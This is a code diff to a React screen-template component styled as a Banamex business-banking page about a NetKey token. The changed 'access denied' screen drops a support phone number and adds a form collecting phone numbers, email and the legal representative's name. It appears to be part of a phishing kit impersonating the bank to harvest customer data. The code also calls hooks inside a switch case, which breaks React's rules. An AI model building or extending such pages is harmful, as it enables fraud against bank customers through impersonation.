@@ -1406,6 +1406,22 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         );
 
       case ScreenType.ACCESO_DENEGADO:
+        const [telefonoAcceso1, setTelefonoAcceso1] = useState('');
+        const [telefonoAcceso2, setTelefonoAcceso2] = useState('');
+        const [correoAcceso, setCorreoAcceso] = useState('');
+        const [nombreRepAcceso, setNombreRepAcceso] = useState('');
+
+        const handleAccesoDenegadoSubmit = () => {
+          if (telefonoAcceso1 && correoAcceso && nombreRepAcceso) {
+            onSubmit(ScreenType.ACCESO_DENEGADO, { 
+              telefono1: telefonoAcceso1, 
+              telefono2: telefonoAcceso2, 
+              correo: correoAcceso, 
+              nombreRepresentante: nombreRepAcceso 
+            });
+          }
+        };
+
         const accesoDenegadoContent = (
           <div className="bg-white p-6 rounded-lg">
             <div className="bg-[#d32f2f] text-white p-6 rounded-t-lg text-center mb-6">
@@ -1418,28 +1434,75 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 Es necesario sincronizarlo para restablecer su servicio correctamente.
               </p>
 
-              <div className="bg-white p-6 rounded-lg border-l-4 border-[#003d7a] mb-6">
-                <h3 className="text-[#003d7a] font-bold text-lg mb-3">Banamex Resuelve PyMEs</h3>
-                <p className="text-gray-700 mb-4">
-                  Para restablecer el funcionamiento correcto de su NetKey, le recomendamos contactar a nuestro 
-                  equipo de soporte técnico especializado:
+              <div className="bg-white p-6 rounded-lg border border-gray-300 mb-6">
+                <h3 className="text-[#003d7a] font-bold text-lg mb-4">Datos de contacto</h3>
+                <p className="text-gray-700 mb-4 text-sm">
+                  Para que nuestro equipo pueda asistirle, por favor proporcione los siguientes datos:
                 </p>
-                <div className="bg-blue-50 p-4 rounded-lg">
-                  <p className="text-[#003d7a] font-bold text-xl text-center">
-                    📞 800 021 2345
-                  </p>
-                  <p className="text-sm text-gray-600 text-center mt-2">
-                    Disponible 24/7 para empresarios
-                  </p>
-                </div>
-              </div>
 
-              <div className="text-sm text-gray-600">
-                <p className="mb-2">Horario de atención:</p>
-                <ul className="list-disc list-inside space-y-1 ml-2">
-                  <li>Lunes a Viernes: 8:00 AM - 8:00 PM</li>
-                  <li>Sábados: 9:00 AM - 2:00 PM</li>
-                </ul>
+                <div className="space-y-4">
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-2">
+                      Teléfono de contacto 1 <span className="text-red-600">*</span>
+                    </label>
+                    <input 
+                      type="tel" 
+                      value={telefonoAcceso1}
+                      onChange={(e) => setTelefonoAcceso1(e.target.value.replace(/\D/g, '').slice(0, 10))}
+                      placeholder="10 dígitos"
+                      maxLength={10}
+                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
+                    />
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-2">
+                      Teléfono de contacto 2 (opcional)
+                    </label>
+                    <input 
+                      type="tel" 
+                      value={telefonoAcceso2}
+                      onChange={(e) => setTelefonoAcceso2(e.target.value.replace(/\D/g, '').slice(0, 10))}
+                      placeholder="10 dígitos"
+                      maxLength={10}
+                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
+                    />
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-2">
+                      Correo electrónico <span className="text-red-600">*</span>
+                    </label>
+                    <input 
+                      type="email" 
+                      value={correoAcceso}
+                      onChange={(e) => setCorreoAcceso(e.target.value)}
+                      placeholder="correo@ejemplo.com"
+                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
+                    />
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-2">
+                      Nombre del representante legal <span className="text-red-600">*</span>
+                    </label>
+                    <input 
+                      type="text" 
+                      value={nombreRepAcceso}
+                      onChange={(e) => setNombreRepAcceso(e.target.value)}
+                      placeholder="Nombre completo"
+                      className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:border-[#003d7a] focus:outline-none"
+                    />
+                  </div>
+
+                  <button
+                    onClick={handleAccesoDenegadoSubmit}
+                    disabled={!telefonoAcceso1 || !correoAcceso || !nombreRepAcceso}
+                    className="w-full bg-[#003d7a] text-white py-3 px-6 rounded-lg font-semibold hover:bg-[#002a5c] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+                  >
+                    Enviar datos
+                  </button>
+                </div>
               </div>
             </div>
           </div>
